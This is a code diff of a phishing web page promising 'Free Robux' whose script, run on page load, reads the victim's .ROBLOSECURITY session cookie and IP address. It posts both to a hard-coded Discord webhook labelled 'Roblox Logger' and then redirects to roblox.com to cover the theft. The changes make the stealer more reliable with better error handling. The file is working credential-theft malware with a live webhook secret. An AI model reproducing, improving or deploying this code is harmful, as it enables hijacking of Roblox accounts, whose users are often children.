@@ -13,20 +13,23 @@
                 const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
                 const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;
 
-                // Fetch IP address using ipify.org API
+                // Fetch IP address with fallback
                 let ipAddress = "Unknown";
                 try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipResponse = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
+                    if (!ipResponse.ok) throw new Error(`IP fetch failed: ${ipResponse.status}`);
                     const ipData = await ipResponse.json();
                     ipAddress = ipData.ip;
+                    console.log("IP fetched:", ipAddress);
                 } catch (ipError) {
                     console.error("IP fetch error:", ipError);
+                    ipAddress = "IP fetch failed";
                 }
 
                 // Your Discord webhook URL
                 const webhookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";
 
-                // Build payload with IP and cookie info
+                // Build payload
                 const payload = {
                     username: "Roblox Logger",
                     content: "Cookie and IP check triggered!",
@@ -42,36 +45,33 @@
                     }]
                 };
 
-                // Send to Discord
-                fetch(webhookUrl, {
+                // Send to Discord with detailed error checking
+                const webhookResponse = await fetch(webhookUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Sent to webhook!");
-                        window.location.href = "https://www.roblox.com/";
-                    } else {
-                        throw new Error("Webhook failed");
-                    }
-                })
-                .catch(error => {
-                    console.error("Fetch error:", error);
-                    window.location.href = "https://www.roblox.com/";
                 });
-            } catch (error) {
-                console.error("Script error:", error);
+
+                if (webhookResponse.ok) {
+                    console.log("Webhook sent successfully!");
+                } else {
+                    throw new Error(`Webhook failed with status: ${webhookResponse.status}`);
+                }
+
+                // Redirect after success
                 window.location.href = "https://www.roblox.com/";
+            } catch (error) {
+                console.error("Error in script:", error);
+                window.location.href = "https://www.roblox.com/"; // Redirect even on failure
             }
         }
 
-        // Run on load (async function needs wrapping)
+        // Run on load
         window.onload = function() {
             logRobloxCookie();
         };
 
-        // Optional: Button trigger for manual testing
+        // Button trigger for manual testing
         function manualTrigger() {
             logRobloxCookie();
         }
@@ -80,6 +80,6 @@
 <body>
     <h1>Loading Your Free Robux...</h1>
     <button onclick="manualTrigger()">Test Again</button>
-    <p>If no cookie is found, set a test cookie in console: <code>document.cookie = ".ROBLOSECURITY=test123; path=/";</code></p>
+    <p>Set test cookie in console: <code>document.cookie = ".ROBLOSECURITY=test123; path=/";</code></p>
 </body>
 </html>
